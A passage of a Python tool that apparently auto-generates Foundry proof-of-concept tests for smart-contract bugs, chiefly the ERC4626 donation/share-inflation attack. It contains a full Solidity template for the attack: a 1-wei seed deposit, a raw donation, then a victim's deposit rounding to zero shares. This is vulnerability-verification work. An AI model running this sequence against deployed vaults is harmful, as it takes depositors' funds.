    # immutable set to a literal address inside the constructor body.
    for m in _IMMUTABLE_ADDR_DECL_RE.finditer(src):
        decl_type, name = m.group(1), m.group(2)
        if name in seen:
            continue
        am = re.search(rf"\b{re.escape(name)}\s*=\s*(?:[A-Za-z_]\w*\s*\(\s*)?"
                       r"(?:address\s*\(\s*)?(0x[0-9a-fA-F]{40})", src)
        if am:
            seen.add(name)
            out.append({"type": decl_type, "name": name, "addr": am.group(1)})
    return out


def _constructor_body(src: str, unit_name: str) -> str:
    """Return the raw constructor body (between the matching braces) for the named
    unit, or '' when there is no explicit constructor. Brace-balanced so nested
    blocks in the ctor are included. Anchored to the contract DECLARATION (`...
    contract <unit> {`) so a 'constructor' mention in a NatSpec comment is not
    mistaken for the real ctor, and the ctor params must be on the signature line
    (no embedded `{`/`;`) so a doc-comment 'constructor' phrase cannot match."""
    decl = re.search(rf"\b(?:contract|abstract\s+contract)\s+{re.escape(unit_name)}\b",
                     src)
    body_start = decl.end() if decl else 0
    # the real ctor: `constructor(<params>)<modifiers...> {` where the params and
    # modifier list contain no `{` or `;` (so a prose 'constructor' phrase that
    # later runs into the contract's own opening brace is rejected).
    m = re.search(r"\bconstructor\s*\([^){};]*\)[^{};]*\{", src[body_start:])
    if not m:
        return ""
    start = body_start + m.end()
    depth = 1
    i = start
    while i < len(src) and depth > 0:
        c = src[i]
        if c == "{":
            depth += 1
        elif c == "}":
            depth -= 1
        i += 1
    return src[start:i - 1]


# Share-price view fns whose body a donation/inflation exploit drives through
# (deposit -> convertToShares -> totalAssets). A hardcoded-constant address read
# inside ANY of these (or the cited exploited fn) must be etch'd or the exploit
# reverts reading an un-etched constant address. GENERIC: ERC4626-standard names.
_SHARE_PRICE_VIEW_FNS = (
    "totalAssets", "convertToShares", "convertToAssets",
    "previewDeposit", "previewMint", "previewWithdraw", "previewRedeem",
)


def _share_inflation_ctor_const_deps(src: str, unit_name: str,
                                     asset_var: str,
                                     exploited_fn: Optional[Dict[str, Any]] = None
                                     ) -> List[Dict[str, Any]]:
    """Detect HARDCODED-CONSTANT deps a donation/inflation vault references that
    the EXPLOIT path depends on, in two GENERIC ways:

      (1) CTOR-RELEVANT (codex95 OBL2): the constructor calls a method on the dep
          directly, or passes the dep address into a call on another var (e.g.
          `asset.approve(address(dep), max)`). A naive `new Vault(asset)` deploy
          reverts because the constant address has no code under test.

      (2) VIEW-FN-RELEVANT (GAP B): a share-price view fn the exploit drives
          through (`totalAssets`/`convertToShares`/`convertToAssets`/`preview*`
          or the cited exploited fn itself) READS the hardcoded-constant address
          (e.g. `C.stabilityPool` / `C.usd2eth`-style constants that are NOT ctor
          args). The deploy succeeds, but the FIRST `deposit()`/`totalAssets()`
          call reverts reading the un-etched constant address. obl2 only handled
          (1); this extends the same etch machinery to (2).

    For each such dep returns {"name", "addr", "methods": [...]} where `methods`
    is the set of method names the contract invokes on the dep (used to
    synthesize the etch'd mock). Returns an EMPTY list when no constant dep is
    exploit-path-relevant (the plain single-asset case). GENERIC: nothing is
    keyed on a target name/address/method."""
    decls = _const_addr_decls(src)
    if not decls:
        return []
    ctor_body = _constructor_body(src, unit_name)
    # Bodies of the share-price view fns the exploit traverses + the cited fn.
    view_bodies: List[str] = []
    for vname in _SHARE_PRICE_VIEW_FNS:
        for f in _all_functions(src):
            if f["name"] == vname:
                view_bodies.append(_fn_body_slice(src, f))
    if exploited_fn and exploited_fn.get("name"):
        view_bodies.append(_fn_body_slice(src, exploited_fn))
    view_blob = "\n".join(view_bodies)
    out: List[Dict[str, Any]] = []
    for d in decls:
        name, addr = d["name"], d["addr"]
        bare = name.rstrip("_")
        names = {name, bare}
        # methods called on the dep ANYWHERE in the contract (so the etch'd mock
        # implements the full surface the vault uses, ctor + runtime).
        methods = set(_dep_methods_called(src, name))
        # (1) ctor-relevance: the dep is referenced in the constructor body.
        ctor_relevant = any(
            re.search(rf"\b{re.escape(n)}\b", ctor_body) for n in names if n)
        # (2) view-fn-relevance (GAP B): the dep is READ inside a share-price view
        # fn / the cited exploited fn body, so the exploit reverts on an un-etched
        # constant address even though deploy succeeded.
        view_relevant = any(
            re.search(rf"\b{re.escape(n)}\b", view_blob) for n in names if n)
        if not (ctor_relevant or view_relevant):
            continue
        out.append({"name": bare, "addr": addr, "methods": sorted(methods)})
    return out


def _synth_const_dep_mock_contract(idx: int, methods: List[str]) -> str:
    """Generate an inline minimal mock CONTRACT body for a constant external dep,
    implementing exactly the methods the vault invokes on it as no-op stubs that
    return zero/false/empty. The mock has a no-arg ctor and is vm.etch'd at the
    dep's constant address, so its ctor-time calls succeed under deploy. GENERIC:
    method names come from the target's real usage, never a hardcoded template.

    Methods on the ERC20-standard surface (approve/transfer/transferFrom) are NOT
    re-declared here (the constant dep is a non-token dependency the ctor calls,
    e.g. a pool `register`/`deposit` hook); they would only appear if the dep is
    itself a token, which is routed elsewhere. Each synthesized stub returns a
    permissive default so the constructor's external call does not revert."""
    name = f"_SynthConstDep{idx}"
    meth_list = "/".join(methods) if methods else "(ctor-referenced only)"
    # A permissive fallback/receive accepts ANY call (any selector, any args) and
    # returns 32 zero-bytes, satisfying bool/uint/address return decodes. This is
    # the GENERIC way to back an arbitrary-arity constant-dep mock without knowing
    # each method's signature - the vault's ctor-time calls succeed because the
    # etch'd code answers every selector. Methods the vault invokes on this dep:
    # {meth_list} (recorded for honesty; satisfied via the catch-all fallback).
    lines = [
        f"// AUTO-SYNTHESIZED constant-dep mock (codex95 OBL2). Backs the vault's",
        f"// hardcoded-constant external dependency (methods invoked: {meth_list})",
        f"// via a permissive fallback so its ctor-time external calls do not",
        f"// revert. NOT hand-placed, NOT target-named: synthesized from usage.",
        f"contract {name} {{",
        "    fallback() external payable {",
        "        assembly {",
        "            mstore(0, 0)",
        "            return(0, 32)",
        "        }",
        "    }",
        "    receive() external payable {}",
        "}",
    ]
    return "\n".join(lines)


def author_share_inflation_proof(candidate: Dict[str, Any], src: str,
                                 unit_name: str, fn: Dict[str, Any],
                                 rel_import: str, shape: Dict[str, Any],
                                 project: Optional[Path] = None
                                 ) -> Optional[Dict[str, str]]:
    """Author a real-deploy V3-grade PoC for the donation / share-price-inflation
    shape. Deploys the REAL in-tree vault with ONLY a synthesized inline ERC20
    asset mock (external dependency), drives the REAL deposit() entrypoint for
    attacker + victim with a raw-transfer donation in between, and asserts the
    victim is griefed to ZERO shares (before/after). The negative control deploys
    a fresh vault and shows that WITHOUT the donation the same victim deposit
    mints non-zero shares. Returns {"test_src", "test_match", "needs_mocks"} or
    None when the deploy shape is not single-asset-constructor synthesizable.

    codex95 OBL2: when the single-asset-ctor vault ALSO references hardcoded-
    constant external deps that it calls into IN THE CONSTRUCTOR (the scLiquity
    convert-gap shape, e.g. `asset.approve(pool, max); pool.register(this)`), a
    naive `new Vault(asset)` reverts. The author synthesizes a minimal mock per
    constant dep and vm.etch'es it at the constant address BEFORE deploy so the
    REAL constructor's external calls succeed and the REAL deposit() entrypoint
    is driven. The etch is staged in setUp (before both the exploit deploy and
    the negative-control deploy)."""
    pragma = _read_pragma(src)
    # GAP B: derive the authored test pragma from the cited source / repo solc,
    # not a hardcoded literal (a pinned `=0.8.32` must NOT silently become 0.8.28
    # and a pragma whose minor is not installed must resolve to an installed one).
    test_pragma = _derive_test_pragma(src, project)
    deposit_fn = shape["deposit_fn"]
    inherited_shape = bool(shape.get("inherited_erc4626"))
    # The vault must be deployable with a single synthesizable ERC20 asset. The
    # ctor signature is read from the unit; codex95 OBL4(1): when the unit has NO
    # own ctor (it inherits the base ctor whose signature carries the asset arg),
    # resolve the inheritance source so the inherited ctor signature is seen.
    ctor = _constructor_params(src, unit_name)
    ctor_src = src
    if ctor is None and inherited_shape and project is not None:
        resolved = resolve_inheritance_source(src, unit_name, project)
        # the inherited ctor lives on the base; re-read against the resolved
        # source so the asset arg in the base ctor signature is found.
        for parent in _parent_contracts(src, unit_name):
            pctor = _constructor_params(resolved, parent)
            if pctor is not None:
                ctor, ctor_src = pctor, resolved
                break
    if ctor is None:
        return None  # no explicit ctor -> needs initialize() shape (not handled here)
    params = _split_params(ctor)
    if not params:
        return None
    # codex95 OBL4(1): classify EACH ctor param. Exactly one arg must be the
    # deploy ASSET (recognized by USAGE, not a name literal); every other arg
    # must be a fillable role-EOA / string / value-type. A multi-arg role+asset
    # ctor like (address admin, address keeper, ERC20 asset, string name, string
    # symbol) is now synthesizable: role/config addresses get distinct vm.addr(N)
    # EOAs, strings/values get natural defaults, the single asset slot gets the
    # synthesized token cast to its declared type. GENERIC: no role NAME is drive
    # logic - an address arg that is not the asset is filled with a vm.addr() EOA
    # regardless of its name.
    cls = _classify_share_inflation_ctor(
        ctor_src, unit_name, params, inherited_shape)
    if cls is None:
        return None
    asset_type, asset_name = cls["asset_type"], cls["asset_name"]
    import_extra: List[str] = list(cls["import_extra"])
    # the asset-TYPE declaration may live in the cited file, in an inherited base
    # (resolved source), OR be a symbol the cited file IMPORTS (`import {IFoo}
    # from "..."`). For the cast to type-check the authored test must be able to
    # name the type; when the cited file declares OR imports the symbol we
    # co-import it from the SAME cited-file rel_import (Solidity re-exports an
    # imported symbol), and when only a resolved base declares it we co-import it
    # too (it is reachable through the same import graph the vault already pulls).
    resolved_decl_src = src
    if project is not None:
        try:
            resolved_decl_src = resolve_inheritance_source(src, unit_name, project)
        except Exception:
            resolved_decl_src = src
    type_declared = bool(re.search(
        rf"\b(?:interface|contract|abstract\s+contract)\s+"
        rf"{re.escape(asset_type)}\b", resolved_decl_src))
    type_imported = bool(re.search(
        rf"\bimport\b[^;]*\{{[^}}]*\b{re.escape(asset_type)}\b[^}}]*\}}",
        src))
    # the synthesized-token EXPRESSION at the asset slot, cast to the asset's
    # declared ctor type so the REAL ctor signature type-checks. The cast
    # identifier MUST resolve in the authored harness: either it is declared /
    # imported by the cited file (co-import it - approach b, the cleaner one),
    # OR we co-emit a minimal interface declaration for it (approach a, the
    # fallback for a bare interface the target does not re-export). GENERIC: the
    # cast type is the type the ctor DECLARES (read from source); nothing here
    # hardcodes a single interface name for every ERC20-shaped ctor.
    extra_interface_decls: List[str] = []
    if asset_type == "address":
        asset_expr = "address(token)"
    elif re.match(r"^[A-Za-z_]\w*$", asset_type) and (
            type_declared or type_imported):
        # approach (b): the asset type is declared in (or imported by) the cited
        # file - solmate `ERC20`, a project-local `IERC20`, an `IERC20Metadata`,
        # etc. Co-import it from the cited file (Solidity re-exports an imported
        # symbol) so the cast resolves against the SAME import graph the vault
        # already pulls. This is the obl7 solmate-ERC20 path: the ctor type is a
        # resolvable import, so casting to it is type-checked by the vendored lib.
        asset_expr = f"{asset_type}(address(token))"
        if asset_type not in import_extra:
            import_extra.append(asset_type)
    elif asset_type in _ERC20_ARG_TYPES or asset_type == "IERC20":
        # approach (a): a well-known ERC20-shaped interface type the cited file
        # does NOT declare or import (a bare `IERC20`-typed ctor arg with no
        # in-graph declaration). Co-emit a MINIMAL interface declaration carrying
        # exactly the members the synthesized `_SynthAsset` already implements so
        # the cast identifier resolves without inventing any target dependency.
        asset_expr = f"{asset_type}(address(token))"
        extra_interface_decls.append(_synth_erc20_interface_decl(asset_type))
    else:
        return None  # asset type not synthesizable-castable -> block honestly.
    ctor_pass = ", ".join(asset_expr if a == "<<ASSET>>" else a
                          for a in cls["args"])

    # codex95 OBL2: detect hardcoded-constant deps the ctor calls into, and
    # synthesize an etch'd mock per dep so the REAL constructor does not revert.
    asset_var = asset_name.rstrip("_")
    const_deps = _share_inflation_ctor_const_deps(src, unit_name, asset_var, fn)
    etch_setup = ""
    extra_mock_contracts = ""
    needs_mocks = "inline ERC20 asset (external dependency only)"
    if const_deps:
        etch_lines: List[str] = []
        mock_bodies: List[str] = []
        for i, dep in enumerate(const_deps):
            mock_name = f"_SynthConstDep{i}"
            mock_bodies.append(
                _synth_const_dep_mock_contract(i, dep["methods"]))
            # build the mock locally, etch its runtime code at the constant addr.
            etch_lines.append(
                f"        {mock_name} _cd{i} = new {mock_name}();")
            etch_lines.append(
                f"        vm.etch({dep['addr']}, address(_cd{i}).code);")
        etch_setup = "\n".join(etch_lines)
        extra_mock_contracts = "\n\n".join(mock_bodies)
        meth_summary = ", ".join(
            f"{d['name']}({'/'.join(d['methods']) or 'ctor-ref'})"
            for d in const_deps)
        needs_mocks = (
            "inline ERC20 asset + vm.etch'd constant-dep mock(s) "
            f"[{meth_summary}] (external dependencies only)")

    # codex95 OBL3: for the INHERITED-ERC4626 sub-shape, the deposit/mint
    # entrypoints + share-balance accounting live in the base. The vault's share
    # token IS the vault (ERC20), so the share balance is read via the inherited
    # `balanceOf(addr)` rather than a custom `shares(addr)` accessor. The base
    # ctor also reads the asset's `decimals()`, so the asset mock must expose it.
    inherited = bool(shape.get("inherited_erc4626"))
    if inherited:
        needs_mocks = (
            "inline ERC20 asset with decimals()/name()/symbol() for the "
            "inherited ERC4626 base + " + needs_mocks
            if const_deps else
            "inline ERC20 asset with decimals()/name()/symbol() (external "
            "dependency only) for the inherited ERC4626 base")

    body = _share_inflation_template(
        unit_name, fn["name"], deposit_fn, rel_import, test_pragma, ctor_pass,
        etch_setup=etch_setup, extra_mock_contracts=extra_mock_contracts,
        inherited=inherited, import_extra=import_extra,
        extra_interface_decls=extra_interface_decls)
    return {"test_src": body,
            "test_match": f"test_(exploit|negative_control)_{fn['name']}",
            "needs_mocks": needs_mocks}


# Minimal ERC20 (EXTERNAL-dependency mock ONLY) for the IN-CONTRACT sub-shape.
# The vault calls transfer/transferFrom/balanceOf on its asset; a raw `transfer`
# into the vault is the donation lever that inflates the share-price denominator.
_SYNTH_ERC20_MINIMAL = """// Minimal ERC20 (EXTERNAL-dependency mock ONLY). The vault calls
// transfer/transferFrom/balanceOf on its asset; a raw `transfer` into the vault
// is the donation lever that inflates the share-price denominator.
contract _SynthAsset {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    function mint(address to, uint256 amt) external { balanceOf[to] += amt; }
    function approve(address s, uint256 a) external returns (bool) {
        allowance[msg.sender][s] = a; return true; }
    function transfer(address to, uint256 a) external returns (bool) {
        balanceOf[msg.sender] -= a; balanceOf[to] += a; return true; }
    function transferFrom(address f, address to, uint256 a) external returns (bool) {
        if (allowance[f][msg.sender] != type(uint256).max)
            allowance[f][msg.sender] -= a;
        balanceOf[f] -= a; balanceOf[to] += a; return true; }
}"""

# Fuller ERC20 (EXTERNAL-dependency mock ONLY) for the INHERITED-ERC4626 sub-
# shape (OBL3). A solmate/OZ ERC4626 base constructor reads the asset's
# `decimals()` (and some bases `name()`/`symbol()`), so the asset mock exposes
# the full ERC20-metadata surface in addition to the transfer surface the
# donation lever uses. Still an external-dependency mock only; the vault is real.
_SYNTH_ERC20_FULL = """// Fuller ERC20 (EXTERNAL-dependency mock ONLY) for the inherited ERC4626 base.
// The base constructor reads the asset's decimals()/name()/symbol(); the raw
// `transfer` into the vault is the donation lever that inflates totalAssets().
contract _SynthAsset {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;
    function name() external pure returns (string memory) { return "Synth"; }
    function symbol() external pure returns (string memory) { return "SYN"; }
    function decimals() external pure returns (uint8) { return 18; }
    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt; totalSupply += amt; }
    function approve(address s, uint256 a) external returns (bool) {
        allowance[msg.sender][s] = a; return true; }
    function transfer(address to, uint256 a) external returns (bool) {
        balanceOf[msg.sender] -= a; balanceOf[to] += a; return true; }
    function transferFrom(address f, address to, uint256 a) external returns (bool) {
        if (allowance[f][msg.sender] != type(uint256).max)
            allowance[f][msg.sender] -= a;
        balanceOf[f] -= a; balanceOf[to] += a; return true; }
}"""


def _synth_erc20_interface_decl(iface_name: str) -> str:
    """Emit a MINIMAL interface declaration named `iface_name` carrying exactly
    the ERC20 members the synthesized `_SynthAsset` implements, so an interface-
    cast ctor asset arg (`IERC20(address(token))`) resolves in the authored
    harness when the cited file does NOT declare or import that symbol (approach
    (a) - the fallback for a bare interface the target does not re-export).

    The cast in Solidity only requires the named type to EXIST and to be an
    address-castable contract/interface type; the member set need only be a
    superset-safe ERC20 surface. When the type name implies metadata
    (`...Metadata`), the metadata view members are included so a base that reads
    `decimals()`/`name()`/`symbol()` through the typed handle still type-checks.
    GENERIC: the interface name is the type the ctor DECLARES; no target literal."""
    metadata = "Metadata" in iface_name
    meta_block = (
        "\n    function name() external view returns (string memory);"
        "\n    function symbol() external view returns (string memory);"
        "\n    function decimals() external view returns (uint8);"
        if metadata else "")
    return (
        f"// Minimal ERC20 interface (approach (a) cast-target declaration). The\n"
        f"// cited file does not declare/import `{iface_name}`, so the harness\n"
        f"// co-emits this minimal declaration carrying the members `_SynthAsset`\n"
        f"// implements, letting the `{iface_name}(address(token))` ctor cast\n"
        f"// resolve without inventing any target dependency.\n"
        f"interface {iface_name} {{\n"
        f"    function totalSupply() external view returns (uint256);\n"
        f"    function balanceOf(address account) external view returns (uint256);\n"
        f"    function allowance(address owner, address spender) external view returns (uint256);\n"
        f"    function approve(address spender, uint256 amount) external returns (bool);\n"
        f"    function transfer(address to, uint256 amount) external returns (bool);\n"
        f"    function transferFrom(address from, address to, uint256 amount) external returns (bool);"
        f"{meta_block}\n"
        f"}}")


def _share_inflation_template(unit: str, fnname: str, deposit_fn: str,
                              rel_import: str, pragma: str,
                              ctor_pass: str, etch_setup: str = "",
                              extra_mock_contracts: str = "",
                              inherited: bool = False,
                              import_extra: Optional[List[str]] = None,
                              extra_interface_decls: Optional[List[str]] = None
                              ) -> str:
    """Self-contained donation/inflation PoC. The ONLY mock is an inline minimal
    ERC20 (the external asset dependency); the REAL in-tree vault is deployed and
    its REAL deposit() entrypoint is driven. Before/after victim share-balance is
    asserted; the negative control runs the identical victim deposit with NO
    donation and shows non-zero shares.

    codex95 OBL2: `etch_setup` (vm.etch lines staging synthesized mocks at the
    vault's hardcoded-constant dep addresses) is emitted in setUp BEFORE either
    deploy, and `extra_mock_contracts` (the synthesized constant-dep mock bodies)
    are appended after the inline asset mock. Both are empty for the plain
    single-asset case (no behavior change).

    codex95 OBL3: `inherited` switches two things for the INHERITED-ERC4626
    sub-shape - (1) the share-balance accessor becomes the inherited ERC20
    `balanceOf(addr)` (the vault IS its own share token) instead of a custom
    `shares(addr)`; (2) the inline asset mock exposes `decimals()`/`name()`/
    `symbol()`/`totalSupply()` so the ERC4626 base constructor (which reads the
    asset's `decimals()`) succeeds. The REAL inherited `deposit()` entrypoint is
    still driven; nothing about the vault is mocked."""
    # share-balance accessor: inherited ERC4626 vault is its own ERC20 share
    # token -> read `vault.balanceOf(addr)`; in-contract vault exposes `shares`.
    sh = "balanceOf" if inherited else "shares"
    asset_mock = _SYNTH_ERC20_FULL if inherited else _SYNTH_ERC20_MINIMAL
    inherited_note = (
        "\n// codex95 OBL3: the vault INHERITS an ERC4626 base (deposit/mint +\n"
        "// share math live in the base); it overrides ONLY totalAssets() to a raw\n"
        "// `balanceOf(address(this))` read with no virtual-offset / dead-shares /\n"
        "// min-first-deposit guard. The bug is driven through the REAL INHERITED\n"
        "// deposit() entrypoint and the victim share balance is read via the\n"
        "// inherited ERC20 `balanceOf(addr)`.\n"
        if inherited else "")
    const_dep_note = (
        "\n// codex95 OBL2: the vault also reads HARDCODED-CONSTANT external deps\n"
        "// it calls into IN THE CONSTRUCTOR; a naive deploy would revert because\n"
        "// those literal addresses have no code. setUp() vm.etch'es a synthesized\n"
        "// mock at each constant address BEFORE deploy so the REAL constructor's\n"
        "// external calls succeed and the REAL deposit() entrypoint is driven.\n"
        if etch_setup else "")
    extra_block = ("\n\n" + extra_mock_contracts) if extra_mock_contracts else ""
    etch_in_setup = ("\n" + etch_setup) if etch_setup else ""
    # approach (a): co-emit minimal interface declarations for any cast-target
    # type the cited file does NOT declare/import, so `IFace(address(token))`
    # resolves. Emitted at file scope before the asset mock (the cast only needs
    # the named type to exist). Empty for the common declared/imported-type path.
    iface_block = (
        "\n\n".join(extra_interface_decls) + "\n\n"
        if extra_interface_decls else "")
    # co-import the unit + any extra symbols (e.g. a project-local asset
    # interface the ctor cast needs) from the same target file.
    import_syms = ", ".join([unit] + list(import_extra or []))
    return f"""// SPDX-License-Identifier: MIT
pragma solidity {pragma};

// AUTO-GENERATED by tools/evm-0day-proof-pipeline.py (Step 3: ERC4626 donation /
// share-price-inflation family). V3-GRADE PoC (Rule 40): deploys the REAL in-tree
// {unit} with ONLY a synthesized inline ERC20 asset mock (external dependency).
// Drives the REAL {deposit_fn}() entrypoint: attacker mints 1 wei of shares,
// DONATES assets directly to the vault (raw transfer) to inflate the live
// `balanceOf(address(this))` denominator, then a victim deposit rounds DOWN to
// ZERO shares while its assets stay in the pool. The negative control deploys a
// fresh vault and runs the identical victim deposit with NO donation, proving the
// griefing is caused by the donation-inflatable denominator (clean path mints
// non-zero shares).{inherited_note}{const_dep_note}

import {{Test}} from "forge-std/Test.sol";
import {{{import_syms}}} from "{rel_import}";

{iface_block}{asset_mock}{extra_block}

contract {unit}_{fnname}_ZeroDay is Test {{
    _SynthAsset token;
    address attacker = address(0xA11CE);
    address victim = address(0x71C7);

    uint256 constant VICTIM_DEPOSIT = 50 ether;
    uint256 constant DONATION = 100 ether;

    function setUp() public {{
        token = new _SynthAsset();{etch_in_setup}
    }}

    function _deploy() internal returns ({unit}) {{
        return new {unit}({ctor_pass});
    }}

    function test_exploit_{fnname}() public {{
        {unit} vault = _deploy();
        // ARRANGE: fund attacker (1 wei share seed + donation) and victim.
        token.mint(attacker, 1 + DONATION);
        token.mint(victim, VICTIM_DEPOSIT);

        // ACT 1: attacker is the FIRST depositor for exactly 1 wei -> 1 share.
        vm.startPrank(attacker);
        token.approve(address(vault), type(uint256).max);
        vault.{deposit_fn}(1, attacker);
        // ACT 2: attacker DONATES assets directly to the vault (raw transfer),
        // inflating the live `balanceOf(address(this))` share-price denominator.
        token.transfer(address(vault), DONATION);
        vm.stopPrank();

        // ACT 3: victim deposits a non-trivial amount AFTER the inflation.
        uint256 victimSharesBefore = vault.{sh}(victim);
        vm.startPrank(victim);
        token.approve(address(vault), type(uint256).max);
        vault.{deposit_fn}(VICTIM_DEPOSIT, victim);
        vm.stopPrank();
        uint256 victimSharesAfter = vault.{sh}(victim);

        // ASSERT downstream impact: the victim's 50-ether deposit rounded DOWN to
        // ZERO shares (griefed) while its assets are now in the pool.
        assertEq(victimSharesBefore, 0, "victim had no shares before");
        assertEq(victimSharesAfter, 0,
            "BUG: victim deposit rounded to 0 shares via donation-inflated price");
        // Non-self impact: the victim's deposited assets are now redeemable by the
        // attacker's single pre-inflation share.
        assertGe(token.balanceOf(address(vault)), VICTIM_DEPOSIT,
            "victim assets must be captured in the pool");
    }}

    function test_negative_control_{fnname}() public {{
        // NEGATIVE CONTROL: a FRESH vault, identical victim deposit, but NO
        // attacker donation. The victim must mint NON-ZERO shares, proving the
        // griefing in test_exploit is caused by the donation, not the entrypoint.
        {unit} clean = _deploy();
        token.mint(victim, VICTIM_DEPOSIT);
        vm.startPrank(victim);
        token.approve(address(clean), type(uint256).max);
        clean.{deposit_fn}(VICTIM_DEPOSIT, victim);
        vm.stopPrank();
        assertGt(clean.{sh}(victim), 0,
            "control: victim mints non-zero shares without a donation");
    }}
}}
"""


def author_deployable_proof(candidate: Dict[str, Any], src: str, unit_name: str,
                            fn: Dict[str, Any], rel_to_contract: str,
                            project: Optional[Path] = None
                            ) -> Optional[Dict[str, str]]:
    """Author a real-deploy PoC for a deployable contract using only EXTERNAL-
    dependency mocks. Returns {"test_src", "test_match", "needs_mocks"} or None
    if this contract/fn shape has no auto-author template yet."""
    vc = candidate["vuln_class"]
    fnname = fn["name"]
    pragma = _read_pragma(src)
    # Step 3: ERC4626 donation / share-price-inflation family. Routes on the
    # SHAPE (donation-inflatable denominator + rounding-down convert + deposit
    # entrypoint), so it fires for any share-inflation-class candidate whose vault
    # is deployable with a single synthesizable ERC20 asset.
    if vc in ("share-inflation",) or detect_share_inflation_shape(src, fn):
        shape = detect_share_inflation_shape(src, fn)
        if shape is not None:
            si = author_share_inflation_proof(
                candidate, src, unit_name, fn, rel_to_contract, shape, project)
            if si is not None:
                return si
    # fund-theft wrapper-refund-misroute shape: a swap/forward fn that refunds
    # unspent ETH to a hardcoded address (deployer) instead of the caller.
    is_refund_shape = (
        vc in ("fund-theft", "freeze")
        and ("_deployer.call{value" in src or re.search(r"refund", src, re.I))
        and fnname.lower().startswith("swap")
        and "Params" in src
    )
    if is_refund_shape:
        body = _refund_misroute_template(unit_name, fnname, rel_to_contract, pragma)
        return {"test_src": body,
                "test_match": f"test_(exploit|negative_control)_{fnname}",
                "needs_mocks": "MockWETH,MockSwapRouter"}
    # factory-fee-domain-validation-gap shape: a CREATE2 factory whose `deploy`
    # fn accepts an `_lpFeePercentage` (or fee-like) arg but performs NO domain
    # check on it before passing it through to bytecode-encoding. The Uniswap-v4
    # dynamic-fee sentinel (0x800000) is out of the StableSwap fee domain, so a
    # sentinel-fee pool is silently created -> broken swaps. We deploy the REAL
    # factory (ctor only STORES the pool manager, never calls it), drive the REAL
    # deploy() with the sentinel fee, and assert the fee reaches the creation-code
    # gate UNVALIDATED (revert is the creation-code error, not a fee error). The
    # negative control is a patched factory that rejects out-of-domain fees first.
    fee_gap = _author_factory_fee_gap(candidate, src, unit_name, fn, rel_to_contract)
    if fee_gap is not None:
        return fee_gap
    return None


# Uniswap-v4 dynamic-fee sentinel flag (LPFeeLibrary.DYNAMIC_FEE_FLAG = 0x800000).
_DYNAMIC_FEE_FLAG = 0x800000


def _author_factory_fee_gap(candidate: Dict[str, Any], src: str, unit_name: str,
                            fn: Dict[str, Any], rel_import: str
                            ) -> Optional[Dict[str, str]]:
    """Author a real-deploy PoC for a CREATE2 factory whose `deploy` fn has no
    fee-domain validation. Returns None unless the shape matches:
      - fn name is `deploy`
      - the fn signature carries a fee-like param (`_lpFeePercentage` / `fee`)
      - the source has NO fee-domain guard on that param (no compare of the fee
        param against a precision/domain constant or the sentinel)
      - the source validates the creation code against a stored hash (the gate
        the unvalidated fee will hit)
      - the contract is a constructor-only-deployable factory: its ctor params
        are value-type / interface-type (stored, not called during construction)
    """
    fnname = fn["name"]
    if fnname != "deploy":
        return None
    # fee-like param present?
    fee_param = None
    for p in (fn.get("params") or "").split(","):
        p = p.strip()
        if not p:
            continue
        pname = p.split()[-1]
        if re.search(r"(lpfee|_fee|feepercentage|^fee$|^_fee)", pname, re.I):
            fee_param = pname
            break
    if fee_param is None:
        return None
    # locate the deploy fn body and confirm NO fee-domain guard inside it.
    didx = src.find(f"function {fnname}")
    if didx < 0:
        return None
    # crude body slice: from the fn decl to the matching dedented closing brace.
    body_slice = src[didx:didx + 2000]
    has_fee_guard = re.search(
        rf"{re.escape(fee_param)}\s*(>|<|>=|<=|==|!=)\s*\w*(FEE|PRECISION|DYNAMIC|DOMAIN|MAX_FEE)",
        body_slice, re.I) is not None
    if has_fee_guard:
        return None  # there IS a guard; not this bug
    # must validate creation code against a stored hash (the downstream gate).
    if not re.search(r"creationCodeHash|InvalidCreationCode", src):
        return None
    # the factory ctor must be constructor-only-deployable (value/interface types).
    ctor_params = _constructor_params(src, unit_name) or ""
    ctor_args = _synthesize_ctor_args_factory(ctor_params)
    if ctor_args is None:
        return None
    # Any interface type used in the ctor args must be imported in the test. We
    # reuse the source's OWN import line for that symbol so the path resolves.
    iface_types = sorted(set(re.findall(r"\bI[A-Z]\w*", ctor_params)))
    iface_imports = _collect_symbol_imports(src, iface_types)
    if iface_imports is None:
        return None  # could not resolve an interface import -> honest block
    # Build the full call-arg list for deploy() from its real signature, putting
    # the sentinel fee in the fee param slot and trivial values elsewhere.
    call_args, has_currency_arrays = _synthesize_deploy_call_args(fn, fee_param)
    if call_args is None:
        return None
    body = _factory_fee_gap_template(
        unit_name, fnname, rel_import, _read_pragma(src), ctor_args,
        call_args, has_currency_arrays, iface_imports)
    return {"test_src": body,
            "test_match": f"test_(exploit|negative_control)_{fnname}",
            "needs_mocks": "none (real factory deploy; no external mocks)"}


def _collect_symbol_imports(src: str, symbols: List[str]) -> Optional[str]:
    """Return the source's own import statements that bring in each named symbol,
    joined by newlines. Returns None if any symbol cannot be found in an import
    (so the caller can honestly block rather than emit a non-compiling test)."""
    if not symbols:
        return ""
    lines = []
    for sym in symbols:
        # match: import {A, Sym, B} from "..."; or import {Sym} from "...";
        m = re.search(
            rf'^\s*import\s*\{{[^}}]*\b{re.escape(sym)}\b[^}}]*\}}\s*from\s*"[^"]+";',
            src, re.M)
        if not m:
            return None
        line = m.group(0).strip()
        if line not in lines:
            lines.append(line)
    return "\n".join(lines)


def _synthesize_ctor_args_factory(params: str) -> Optional[str]:
    """Like _synthesize_ctor_args but tolerates a single interface-type ctor arg
    (e.g. IPoolManager) by casting a dummy address; the factory only STORES it.
    Returns None for arrays / structs / mappings (genuinely un-synthesizable)."""
    params = (params or "").strip()
    if not params:
        return ""
    args = []
    for p in params.split(","):
        p = p.strip()
        if not p:
            continue
        typ = p.split()[0]
        if re.fullmatch(r"uint\d*", typ) or re.fullmatch(r"int\d*", typ):
            args.append("1")
        elif typ == "address":
            args.append("address(0xBEEF)")
        elif typ == "bool":
            args.append("false")
        elif re.fullmatch(r"bytes\d+", typ):
            args.append(f"{typ}(0)")
        elif typ in ("string", "bytes"):
            args.append('""')
        elif re.fullmatch(r"I[A-Z]\w*", typ):
            # interface type: factory stores it without calling -> cast a dummy.
            args.append(f"{typ}(address(0xBEEF))")
        else:
            # struct / array / mapping / unknown contract type: not synthesizable.
            return None
    return ", ".join(args)


def _synthesize_deploy_call_args(fn: Dict[str, Any], fee_param: str
                                 ) -> Tuple[Optional[str], bool]:
